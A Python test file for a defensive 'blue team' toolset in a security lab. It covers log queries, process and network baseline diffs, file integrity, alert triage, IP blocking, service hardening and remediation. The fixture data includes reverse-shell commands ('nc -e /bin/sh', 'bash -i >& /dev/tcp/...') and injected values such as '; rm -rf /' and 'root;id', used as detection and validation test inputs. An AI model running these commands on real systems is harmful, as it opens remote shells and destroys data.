"""蓝队工具测试（P2）— 全部不需要 docker。

通过 FunctionTool.on_invoke_tool 调用底层函数（与红队工具测试一致的
模式），store 用 tmp_path 下的真实 TelemetryStore 预填合成数据；
docker 交互通过 monkeypatch 模块级 _docker_exec / _docker_put 模拟。
"""

from __future__ import annotations

import asyncio
import json
import time

import pytest

from cyberorion.telemetry.binding import get_store, set_store
from cyberorion.telemetry.store import TelemetryStore
from cyberorion.tools.blue import (
    block_ip, file_integrity, harden_service, list_alerts,
    network_summary, process_audit, query_logs, remediate,
    report_finding, triage_alert, unblock_ip,
)
from cyberorion.tools.blue import files as files_mod
from cyberorion.tools.blue import respond as respond_mod


def call(tool, **kwargs) -> str:
    """以 JSON 参数调用一个 FunctionTool，返回字符串结果。"""
    return asyncio.run(tool.on_invoke_tool(None, json.dumps(kwargs)))


@pytest.fixture()
def store(tmp_path):
    s = TelemetryStore(tmp_path / "telemetry.db", session_id="session_test")
    set_store(s)
    yield s
    set_store(None)
    s.close()


@pytest.fixture()
def unbound():
    set_store(None)
    yield
    set_store(None)


# ---------------------------------------------------------------------------
# store 绑定
# ---------------------------------------------------------------------------

class TestBinding:
    def test_set_get_roundtrip(self, store):
        assert get_store() is store
        set_store(None)
        assert get_store() is None

    def test_tools_degrade_when_unbound(self, unbound):
        out = call(query_logs)
        assert "未绑定" in out
        out = call(report_finding, host="dvwa", technique="T1190",
                   verdict="malicious", confidence=0.9,
                   evidence="ev", title="t")
        assert "未绑定" in out
        out = call(list_alerts)
        assert "未绑定" in out
        out = call(triage_alert, alert_id=1)
        assert "未绑定" in out
        out = call(network_summary, host="dvwa")
        assert "未绑定" in out
        out = call(process_audit, host="dvwa")
        assert "未绑定" in out


# ---------------------------------------------------------------------------
# query_logs
# ---------------------------------------------------------------------------

class TestQueryLogs:
    def _fill(self, store):
        now = time.time()
        store.insert_event(host="dvwa", source="web_access", technique="T1190",
                           severity="medium", summary="SQLi UNION SELECT",
                           raw="r1", ts=now - 60)
        store.insert_event(host="weak_ssh", source="auth", technique="T1110",
                           severity="high", summary="SSH brute force from 1.2.3.4",
                           raw="r2", ts=now - 120)
        store.insert_event(host="weak_ssh", source="auth", technique="T1078",
                           severity="medium", summary="SSH login accepted",
                           raw="r3", ts=now - 3600)

    def test_filters(self, store):
        self._fill(store)
        # 默认 30 分钟窗口：不含 1 小时前的事件。
        out = call(query_logs)
        assert "命中 2 条" in out
        out = call(query_logs, since_minutes=0)
        assert "命中 3 条" in out
        out = call(query_logs, host="weak_ssh", since_minutes=0)
        assert "命中 2 条" in out
        assert "dvwa" not in out
        out = call(query_logs, source="web_access")
        assert "命中 1 条" in out and "SQLi" in out
        out = call(query_logs, technique="T1110")
        assert "T1110" in out and "T1078" not in out
        out = call(query_logs, text="brute")
        assert "brute force" in out
        # 时间窗：最近 30 分钟不含 1 小时前的事件。
        out = call(query_logs, host="weak_ssh", since_minutes=30)
        assert "命中 1 条" in out

    def test_no_match(self, store):
        self._fill(store)
        out = call(query_logs, host="log4j")
        assert "未命中" in out


# ---------------------------------------------------------------------------
# network_summary / process_audit 基线对比
# ---------------------------------------------------------------------------

class TestNetworkSummary:
    def test_diff_new_and_removed(self, store):
        store.insert_snapshot("dvwa", "net", [
            {"proto": "tcp", "addr": "0.0.0.0", "port": 80, "proc": "apache2"},
            {"proto": "tcp", "addr": "0.0.0.0", "port": 3306, "proc": "mysqld"},
        ])
        store.insert_snapshot("dvwa", "net", [
            {"proto": "tcp", "addr": "0.0.0.0", "port": 80, "proc": "apache2"},
            {"proto": "tcp", "addr": "0.0.0.0", "port": 4444, "proc": "nc"},
        ])
        out = call(network_summary, host="dvwa")
        assert "新增监听" in out and "4444" in out
        assert "可疑端口" in out
        assert "消失监听" in out and "3306" in out

    def test_no_baseline(self, store):
        store.insert_snapshot("weak_ssh", "net", [
            {"proto": "tcp", "addr": "0.0.0.0", "port": 22, "proc": "sshd"},
        ])
        out = call(network_summary, host="weak_ssh")
        assert "无会话基线" in out

    def test_no_snapshot(self, store):
        out = call(network_summary, host="log4j")
        assert "暂无 net 快照" in out

    def test_empty_host(self, store):
        assert "不能为空" in call(network_summary, host="")


class TestProcessAudit:
    BASE = [
        {"pid": 1, "user": "root", "cmd": "/sbin/init"},
        {"pid": 100, "user": "www-data", "cmd": "apache2 -DFOREGROUND"},
    ]

    def test_diff_and_flags(self, store):
        store.insert_snapshot("dvwa", "process", self.BASE)
        store.insert_snapshot("dvwa", "process", self.BASE + [
            {"pid": 500, "user": "www-data", "cmd": "nc -l -p 4444 -e /bin/sh"},
            {"pid": 501, "user": "root", "cmd": "bash -i >& /dev/tcp/1.2.3.4/53 0>&1"},
            {"pid": 502, "user": "www-data", "cmd": "/usr/sbin/cron"},
        ])
        out = call(process_audit, host="dvwa")
        assert "新增进程 3 个" in out
        assert "可疑" in out
        assert "nc -l" in out
        assert "反弹shell(root)" in out
        assert "/usr/sbin/cron" in out

    def test_no_baseline(self, store):
        store.insert_snapshot("dvwa", "process", self.BASE)
        out = call(process_audit, host="dvwa")
        assert "无会话基线" in out

    def test_full_listing(self, store):
        store.insert_snapshot("dvwa", "process", self.BASE)
        out = call(process_audit, host="dvwa", full=True)
        assert "完整进程列表" in out and "apache2" in out

    def test_no_snapshot(self, store):
        assert "暂无 process 快照" in call(process_audit, host="dvwa")


# ---------------------------------------------------------------------------
# file_integrity（docker exec 打桩）
# ---------------------------------------------------------------------------

def _sha(label: str) -> str:
    return format(abs(hash(label)) % (16 ** 64), "064x")


def _make_exec(files: dict):
    """构造 _docker_exec 打桩：对 find|sha256sum 返回 files 的内容。"""
    def fake(container, cmd, timeout=60, user=None):
        if "sha256sum" in cmd:
            out = "".join(f"{h}  {p}\n" for p, h in files.items())
            return 0, out, ""
        return 1, "", "unexpected cmd"
    return fake


class TestFileIntegrity:
    BASE = {
        "/var/www/html/index.php": _sha("index"),
        "/etc/ssh/sshd_config": _sha("sshd"),
        "/etc/passwd": _sha("passwd"),
    }

    def test_baseline_then_diff(self, store, monkeypatch):
        monkeypatch.setattr(files_mod, "_docker_exec",
                            _make_exec(dict(self.BASE)))
        out = call(file_integrity, host="dvwa")
        assert "基线已建立" in out and "文件数=3" in out

        # 攻击发生：新增 webshell + 改动 sshd_config + 删除 passwd 跟踪。
        changed = dict(self.BASE)
        changed["/var/www/html/hackable/uploads/shell.php"] = _sha("shell")
        changed["/etc/ssh/sshd_config"] = _sha("sshd-evil")
        del changed["/etc/passwd"]
        monkeypatch.setattr(files_mod, "_docker_exec",
                            _make_exec(changed))
        out = call(file_integrity, host="dvwa")
        assert "新增文件 1 个" in out
        assert "疑似 webshell" in out
        assert "修改文件 1 个" in out
        assert "敏感配置被改动" in out and "sshd_config" in out
        assert "删除文件 1 个" in out and "/etc/passwd" in out

    def test_no_change(self, store, monkeypatch):
        monkeypatch.setattr(files_mod, "_docker_exec",
                            _make_exec(dict(self.BASE)))
        call(file_integrity, host="dvwa")
        out = call(file_integrity, host="dvwa")
        assert "无变化" in out

    def test_docker_down(self, store, monkeypatch):
        monkeypatch.setattr(
            files_mod, "_docker_exec",
            lambda *a, **k: (1, "", "No such container"))
        out = call(file_integrity, host="dvwa")
        assert "失败" in out and "No such container" in out

    def test_bad_paths(self, store, monkeypatch):
        monkeypatch.setattr(files_mod, "_docker_exec",
                            _make_exec(dict(self.BASE)))
        out = call(file_integrity, host="dvwa", paths="/etc; rm -rf /")
        assert "非法路径" in out


# ---------------------------------------------------------------------------
# 告警流：report_finding -> list_alerts -> triage_alert
# ---------------------------------------------------------------------------

class TestAlertFlow:
    def test_full_flow(self, store):
        out = call(report_finding, host="weak_ssh", technique="T1110",
                   verdict="suspicious", confidence=0.7,
                   evidence="3 failed logins from 1.2.3.4", title="SSH 暴力破解")
        assert "id=1" in out

        out = call(list_alerts)
        assert "#1" in out and "suspicious" in out
        out = call(list_alerts, status="closed")
        assert "没有符合条件" in out

        # 预填关联事件：同主机 ±10min + 同技术其它主机。
        ts = store.get_alert(1)["ts"]
        store.insert_event(host="weak_ssh", source="auth", technique="T1110",
                           severity="high",
                           summary="SSH brute force: 5 failed logins from 1.2.3.4",
                           raw="r", ts=ts - 60)
        store.insert_event(host="weak_ssh", source="auth", technique="T1078",
                           severity="medium", summary="unrelated", raw="r",
                           ts=ts - 7200)  # 窗口外
        store.insert_event(host="dvwa", source="web_access", technique="T1110",
                           severity="medium", summary="same tech other host",
                           raw="r", ts=ts - 7200)
        store.insert_snapshot("weak_ssh", "process",
                              [{"pid": 1, "user": "root", "cmd": "init"}])
        store.insert_snapshot("weak_ssh", "process",
                              [{"pid": 1, "user": "root", "cmd": "init"},
                               {"pid": 9, "user": "root", "cmd": "xmrig"}])

        out = call(triage_alert, alert_id=1)
        assert "研判告警 #1" in out
        assert "brute force" in out           # 同主机窗口内事件
        assert "same tech other host" in out  # 同技术全会话
        assert "unrelated" not in out         # 窗口外被排除
        assert "xmrig" in out or "可疑" in out  # 快照差异
        assert "ack" in out
        assert store.get_alert(1)["status"] == "ack"

    def test_validation(self, store):
        out = call(report_finding, host="dvwa", technique="T1190",
                   verdict="evil", confidence=0.5, evidence="e", title="t")
        assert "非法 verdict" in out
        out = call(report_finding, host="dvwa", technique="",
                   verdict="malicious", confidence=1.5, evidence="e", title="t")
        assert "0.0~1.0" in out
        out = call(report_finding, host="", technique="",
                   verdict="malicious", confidence=0.9, evidence="e", title="t")
        assert "不能为空" in out

    def test_triage_missing(self, store):
        assert "不存在" in call(triage_alert, alert_id=999)


# ---------------------------------------------------------------------------
# 处置工具（docker 打桩）
# ---------------------------------------------------------------------------

class TestRespond:
    def test_block_ip_validation(self, store):
        out = call(block_ip, ip="1.2.3.4; rm -rf /")
        assert "非法 IP" in out
        out = call(block_ip, ip="10/32")
        assert "非法 IP" in out
        out = call(unblock_ip, ip="")
        assert "非法 IP" in out

    def test_block_unblock_flow(self, store, monkeypatch):
        calls = []

        def fake_exec(container, cmd, timeout=60, user=None):
            calls.append((container, cmd))
            return 0, "", ""

        monkeypatch.setattr(respond_mod, "_docker_exec", fake_exec)
        out = call(block_ip, ip="1.2.3.4", container="weak_ssh")
        assert "已封禁" in out
        assert any("iptables -I INPUT -s 1.2.3.4 -j DROP" in c
                   for _, c in calls)
        out = call(unblock_ip, ip="1.2.3.4", container="weak_ssh")
        assert "已解封" in out
        assert any("iptables -D INPUT -s 1.2.3.4 -j DROP" in c
                   for _, c in calls)

    def test_block_all_targets(self, store, monkeypatch):
        seen = []
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda c, cmd, **k: (seen.append(c) or (0, "", "")))
        out = call(block_ip, ip="5.6.7.8")
        # 默认封禁场景内全部 3 个目标。
        assert set(seen) == {"cyberorion_dvwa", "cyberorion_weak_ssh",
                             "cyberorion_log4j"}
        assert out.count("已封禁") == 3

    def test_block_docker_down(self, store, monkeypatch):
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda *a, **k: (1, "", "Cannot connect to the Docker daemon"))
        out = call(block_ip, ip="1.2.3.4", container="weak_ssh")
        assert "失败" in out and "Docker daemon" in out

    def test_harden_ssh_audit(self, store, monkeypatch):
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda c, cmd, **k: (0, "PasswordAuthentication yes\n"
                                    "PermitRootLogin yes\n", ""))
        out = call(harden_service, target="weak_ssh", service="ssh",
                   action="audit")
        assert "(弱)" in out and "弱配置" in out

    def test_harden_ssh_apply(self, store, monkeypatch):
        config = ("Port 22\nPasswordAuthentication yes\n"
                  "PermitRootLogin yes\n")
        hardened = ("PasswordAuthentication no\n"
                    "PermitRootLogin no\nPermitEmptyPasswords no\n")

        def fake_exec(container, cmd, timeout=60, user=None):
            if cmd.startswith("cat /etc/ssh/sshd_config"):
                return 0, config, ""
            if "egrep" in cmd:
                return 0, hardened, ""
            if "sshd -t" in cmd:
                return 0, "RELOAD_OK", ""
            return 0, "", ""  # 备份 cp

        monkeypatch.setattr(respond_mod, "_docker_exec", fake_exec)
        put = {}

        def fake_put(container, path, content):
            put[path] = content
            return 0, "", ""

        monkeypatch.setattr(respond_mod, "_docker_put", fake_put)

        out = call(harden_service, target="weak_ssh", service="ssh",
                   action="apply")
        assert "加固已应用" in out
        assert "PasswordAuthentication: yes -> no" in out
        assert "复查: 全部生效" in out
        # 写入的内容确实包含三项加固设置。
        written = put.get("/etc/ssh/sshd_config", "")
        assert "PasswordAuthentication no" in written
        assert "PermitRootLogin no" in written

    def test_harden_ssh_apply_container_down(self, store, monkeypatch):
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda *a, **k: (1, "", "No such container"))
        out = call(harden_service, target="weak_ssh", service="ssh",
                   action="apply")
        assert "加固失败" in out

    def test_harden_ssh_rollback_no_backup(self, store, monkeypatch):
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda *a, **k: (1, "", "no backup"))
        out = call(harden_service, target="weak_ssh", service="ssh",
                   action="rollback")
        assert "回滚失败" in out

    def test_harden_dvwa_set_high(self, store, monkeypatch):
        config = ("<?php\n$_DVWA[ 'default_security_level' ] = 'low';\n")
        state = {"level": "low"}

        def fake_exec(container, cmd, timeout=60, user=None):
            if "cat /var/www/html/config/config.inc.php" in cmd:
                return 0, config, ""
            if "grep security_level" in cmd:
                return 0, ("$_DVWA[ 'default_security_level' ] = "
                           f"'{state['level']}';\n"), ""
            return 0, "", ""

        monkeypatch.setattr(respond_mod, "_docker_exec", fake_exec)

        def fake_put(container, path, content):
            state["level"] = "impossible"
            return 0, "", ""

        monkeypatch.setattr(respond_mod, "_docker_put", fake_put)
        out = call(harden_service, target="dvwa", service="dvwa",
                   action="set_high")
        assert "low -> impossible" in out
        assert "验证通过" in out

    def test_harden_dvwa_set_high_idempotent(self, store, monkeypatch):
        """已是 impossible 时应报幂等成功，而不是误报“未找到配置行”。"""
        config = ("<?php\n$_DVWA[ 'default_security_level' ] = 'impossible';\n")
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda c, cmd, **k: (0, config, ""))
        out = call(harden_service, target="dvwa", service="dvwa",
                   action="set_high")
        assert "已是 impossible" in out
        assert "加固失败" not in out

    def test_block_ip_records_response_event(self, store, monkeypatch):
        """P4：block_ip / harden_service 成功后写入 source='response' 事件。"""
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda *a, **k: (0, "", ""))
        call(block_ip, ip="1.2.3.4", container="weak_ssh")
        events = store.query_events(source="response")
        assert len(events) == 1
        assert events[0]["severity"] == "info"
        assert "block_ip" in events[0]["summary"]
        assert "1.2.3.4" in events[0]["summary"]

    def test_block_ip_failure_records_nothing(self, store, monkeypatch):
        """封禁全部失败时不产生防御响应事件。"""
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda *a, **k: (1, "", "Cannot connect to the Docker daemon"))
        call(block_ip, ip="1.2.3.4", container="weak_ssh")
        assert store.query_events(source="response") == []

    def test_harden_audit_records_nothing(self, store, monkeypatch):
        """audit 是只读操作，不算防御响应。"""
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda c, cmd, **k: (0, "PasswordAuthentication no\n", ""))
        call(harden_service, target="weak_ssh", service="ssh", action="audit")
        assert store.query_events(source="response") == []

    def test_harden_invalid(self, store):
        out = call(harden_service, target="weak_ssh", service="ftp",
                   action="apply")
        assert "未知 service" in out
        out = call(harden_service, target="weak_ssh", service="ssh",
                   action="nuke")
        assert "apply / audit / rollback" in out


# ---------------------------------------------------------------------------
# remediate 失陷清除工具（docker 打桩）
# ---------------------------------------------------------------------------

class TestRemediate:
    def test_invalid_action_and_args(self, store, monkeypatch):
        out = call(remediate, host="dvwa", action="nuke", target_detail="1")
        assert "非法 action" in out
        out = call(remediate, host="dvwa", action="kill_process",
                   target_detail="")
        assert "非法 target_detail" in out
        # 未知 host 按原始容器名透传，docker exec 失败时诚实报处置失败。
        monkeypatch.setattr(respond_mod, "_docker_exec",
                            lambda *a, **k: (1, "", "No such container"))
        out = call(remediate, host="nonexistent_host", action="kill_process",
                   target_detail="123")
        assert "处置失败" in out

    def test_kill_process_validation(self, store):
        out = call(remediate, host="dvwa", action="kill_process",
                   target_detail="1; rm -rf /")
        assert "非法 pid" in out
        out = call(remediate, host="dvwa", action="kill_process",
                   target_detail="1")
        assert "拒绝终止 pid<=1" in out

    def test_kill_process_flow(self, store, monkeypatch):
        state = {"alive": True}

        def fake_exec(container, cmd, timeout=60, user=None):
            if cmd.startswith("kill -0"):
                return (0 if state["alive"] else 1), "", ""
            if cmd.startswith("kill "):
                state["alive"] = False
                return 0, "", ""
            if "cmdline" in cmd:
                return 0, "bash -i >& /dev/tcp/1.2.3.4/4444", ""
            return 0, "", ""

        monkeypatch.setattr(respond_mod, "_docker_exec", fake_exec)
        out = call(remediate, host="dvwa", action="kill_process",
                   target_detail="777")
        assert "已终止进程 777" in out
        assert "复查确认" in out
        events = store.query_events(source="response")
        assert len(events) == 1 and "remediate" in events[0]["summary"]

    def test_kill_process_failure_records_nothing(self, store, monkeypatch):
        # 进程始终存活（kill 无效） -> 诚实报失败，不记响应事件。
        monkeypatch.setattr(respond_mod, "_docker_exec",
                            lambda *a, **k: (0, "", ""))
        out = call(remediate, host="dvwa", action="kill_process",
                   target_detail="777")
        assert "处置失败" in out
        assert store.query_events(source="response") == []

    def test_remove_file_validation(self, store):
        for bad in ("../../etc/passwd", "/etc/passwd", "/bin/sh",
                    "/var/www/x.php; id", "relative.php"):
            out = call(remediate, host="dvwa", action="remove_file",
                       target_detail=bad)
            assert "非法路径" in out or "拒绝" in out, bad

    def test_remove_file_flow(self, store, monkeypatch):
        cmds = []

        def fake_exec(container, cmd, timeout=60, user=None):
            cmds.append(cmd)
            if "test -d" in cmd:
                return 0, "", ""          # 存在且不是目录
            if cmd.startswith("test -e"):
                return 0, "", ""          # 复查：已消失（无 STILL）
            return 0, "", ""

        monkeypatch.setattr(respond_mod, "_docker_exec", fake_exec)
        out = call(remediate, host="dvwa", action="remove_file",
                   target_detail="/var/www/html/uploads/shell.php")
        assert "已删除" in out and "cyberorion.bak" in out
        assert any("cp -p /var/www/html/uploads/shell.php" in c for c in cmds)
        assert any(c.startswith("rm -f ") for c in cmds)

    def test_remove_file_missing(self, store, monkeypatch):
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda c, cmd, **k: (0, "GONE", "") if "test -e" in cmd
            else (0, "", ""))
        out = call(remediate, host="dvwa", action="remove_file",
                   target_detail="/tmp/nope.php")
        assert "不存在" in out

    def test_remove_user_protects_system_accounts(self, store, monkeypatch):
        monkeypatch.setattr(respond_mod, "_docker_exec",
                            lambda c, cmd, **k: (0, "0", ""))
        out = call(remediate, host="weak_ssh", action="remove_user",
                   target_detail="root")
        assert "拒绝删除系统账户" in out

    def test_remove_user_flow(self, store, monkeypatch):
        state = {"exists": True}

        def fake_exec(container, cmd, timeout=60, user=None):
            if cmd.startswith("id -u"):
                return (0, "1001", "") if state["exists"] else (1, "", "")
            if cmd.startswith("userdel"):
                state["exists"] = False
                return 0, "", ""
            return 0, "", ""

        monkeypatch.setattr(respond_mod, "_docker_exec", fake_exec)
        out = call(remediate, host="weak_ssh", action="remove_user",
                   target_detail="backdoor")
        assert "已删除用户 backdoor" in out and "uid=1001" in out

    def test_remove_user_bad_name(self, store):
        out = call(remediate, host="weak_ssh", action="remove_user",
                   target_detail="root;id")
        assert "非法用户名" in out

    def test_lock_user_flow(self, store, monkeypatch):
        def fake_exec(container, cmd, timeout=60, user=None):
            if cmd.startswith("id -u"):
                return 0, "1000", ""
            if "shadow" in cmd:
                return 0, "!\n", ""
            return 0, "", ""

        monkeypatch.setattr(respond_mod, "_docker_exec", fake_exec)
        out = call(remediate, host="weak_ssh", action="lock_user",
                   target_detail="ctf")
        assert "已锁定用户 ctf" in out

    def test_lock_user_not_verified(self, store, monkeypatch):
        def fake_exec(container, cmd, timeout=60, user=None):
            if cmd.startswith("id -u"):
                return 0, "1000", ""
            if "shadow" in cmd:
                return 0, "$6$abc\n", ""   # 仍是密码哈希 -> 锁定未生效
            return 0, "", ""

        monkeypatch.setattr(respond_mod, "_docker_exec", fake_exec)
        out = call(remediate, host="weak_ssh", action="lock_user",
                   target_detail="ctf")
        assert "处置失败" in out and "锁定未生效" in out

    def test_remove_ssh_keys_flow(self, store, monkeypatch):
        def fake_exec(container, cmd, timeout=60, user=None):
            if cmd.startswith("id -u"):
                return 0, "1000", ""
            if "test -f $p && echo FOUND" in cmd:
                return 0, "FOUND", ""
            if "echo STILL" in cmd:
                return 0, "GONE", ""
            return 0, "", ""

        monkeypatch.setattr(respond_mod, "_docker_exec", fake_exec)
        out = call(remediate, host="weak_ssh", action="remove_ssh_keys",
                   target_detail="ctf")
        assert "已移除" in out and "authorized_keys" in out

    def test_clear_cron_flow(self, store, monkeypatch):
        monkeypatch.setattr(
            respond_mod, "_docker_exec",
            lambda c, cmd, **k: (0, "1000", "") if cmd.startswith("id -u")
            else (0, "", ""))
        out = call(remediate, host="weak_ssh", action="clear_cron",
                   target_detail="ctf")
        assert "已清空" in out

    def test_restart_service_whitelist(self, store):
        out = call(remediate, host="dvwa", action="restart_service",
                   target_detail="nginx; id")
        assert "不在白名单" in out

    def test_restart_service_flow(self, store, monkeypatch):
        def fake_exec(container, cmd, timeout=60, user=None):
            if cmd.startswith("pidof"):
                return 0, "123 456", ""
            if "restart" in cmd:
                return 0, "", ""
            return 1, "", ""

        monkeypatch.setattr(respond_mod, "_docker_exec", fake_exec)
        out = call(remediate, host="dvwa", action="restart_service",
                   target_detail="apache2")
        assert "已重启 apache2" in out and "123 456" in out


# ---------------------------------------------------------------------------
# 信息隔离静态检查
# ---------------------------------------------------------------------------

class TestIsolation:
    def test_no_ground_truth_access(self):
        """tools/blue 的任何模块都不得引用 ground truth 或 attacks 表。"""
        from pathlib import Path
        import cyberorion.tools.blue as pkg
        pkg_dir = Path(pkg.__file__).parent
        banned = ("query_attacks", "get_ground_truth", "set_ground_truth",
                  "eval.ground_truth", "eval import", "GroundTruth(")
        for py in pkg_dir.glob("*.py"):
            src = py.read_text(encoding="utf-8")
            for token in banned:
                assert token not in src, f"{py.name}: {token}"
